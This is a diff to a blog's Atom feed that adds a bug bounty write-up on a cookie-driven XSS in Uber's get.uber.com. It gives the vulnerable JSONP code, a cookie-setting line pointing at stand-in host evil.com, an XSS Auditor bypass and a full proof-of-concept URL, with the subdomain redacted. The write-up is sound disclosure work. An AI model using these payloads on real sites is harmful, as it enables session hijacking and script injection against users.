@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://zhchbin.github.io/"/>
-  <updated>2016-12-25T09:25:00.000Z</updated>
+  <updated>2017-08-30T13:20:30.000Z</updated>
   <id>http://zhchbin.github.io/</id>
   
   <author>
@@ -14,6 +14,61 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[BBP系列二] Uber XSS via Cookie</title>
+    <link href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/"/>
+    <id>http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/</id>
+    <published>2017-08-30T11:36:20.000Z</published>
+    <updated>2017-08-30T13:20:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>
+<h2 id="JSONP-Request"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</h2><p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="keyword">this</span>.log(<span class="string">"making idr call"</span>),</span><br><span class="line">    a = <span class="keyword">this</span>.rfiServer ? <span class="keyword">this</span>.rfiServer : <span class="string">"a.rfihub.com"</span>,</span><br><span class="line">    b = <span class="keyword">this</span>.getProtocol() + <span class="string">"//"</span> + a + <span class="string">"/idr.js"</span>,</span><br><span class="line">    <span class="keyword">this</span>.jsonpGet(b, &#123;&#125;, <span class="keyword">this</span>.idrCallback, <span class="string">"cmZpSWRJbkNhY2hl"</span>),</span><br><span class="line">    <span class="keyword">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg" alt=""></p>
+<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="external">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg" alt=""></p>
+<p>After reading through these lines of code:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">this</span>.readCookie(<span class="string">"_rfiServer"</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="keyword">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure>
+<p>We could get the information that the initial value of <code>this.rfiServer</code> was set by using value of cookie <code>_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>
+<ul>
+<li>HTTP Header CRLF Injection at any subdomain of uber.com</li>
+<li>XSS at any subdomain of uber.com</li>
+</ul>
+<p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
+<h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="class">.cookie</span> = <span class="string">'_rfiServer=eviljs.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p>
+<h2 id="XSS-of-uber-com-but-Out-of-Scope"><a href="#XSS-of-uber-com-but-Out-of-Scope" class="headerlink" title="XSS of uber.com but Out of Scope"></a>XSS of uber.com but Out of Scope</h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p>
+<ol>
+<li><code>&quot;</code> is reflected and not encoded. We can inject any attribution into <code>input</code> tag.</li>
+<li><code>type=&quot;text&quot;</code> is after the injection point. So we can inject <code>type=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;</code>. Note that when there is two types, the second one will be ignored.</li>
+<li><code>&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code>o&gt;nerror</code>.</li>
+</ol>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
+<li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li>
+<li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li>
+<li><p>The final PoC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span><br><span class="line">email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;This write up is about part of my last XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explai
+    
+    </summary>
+    
+    
+      <category term="BBP" scheme="http://zhchbin.github.io/tags/BBP/"/>
+    
+      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
+    
+      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>分享插件AddThis导致的DOM XSS</title>
